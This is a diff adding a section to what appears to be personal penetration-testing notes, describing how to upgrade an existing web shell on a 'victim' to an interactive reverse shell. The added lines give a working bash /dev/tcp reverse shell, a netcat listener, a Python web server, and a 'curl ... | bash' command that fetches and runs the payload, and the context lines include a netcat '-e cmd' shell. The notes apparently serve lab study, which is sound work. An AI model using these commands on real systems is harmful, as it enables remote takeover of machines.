@@ -68,3 +68,40 @@ nc -v <kali_ip_here> 1337
 
 nc.exe -v <kali_ip_here> 1337 -e cmd
 ```
+
+### Web Shell -> Reverse Shell Upgrade
+
+* I personally do not like operating in web shells because of their clunky nature
+* Let's fix that
+* Situation: You ALREADY have a web shell on the victim
+
+Create file:
+
+rev\_shell:
+
+```
+#!/bin/bash
+bash -i >& /dev/tcp/192.168.49.90/1337 0>&1
+```
+
+Start Netcat listener on Kali:
+
+```
+nc -lnvp 1337
+```
+
+Begin HTTP Server on Kali:
+
+```
+python3 -m http.server 80
+```
+
+Transfer file to the victim (I found out that you need to use curl when piping to bash):
+
+```
+curl 192.168.49.90/rev_shell | bash
+```
+
+Go back to your Netcat listener:
+
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
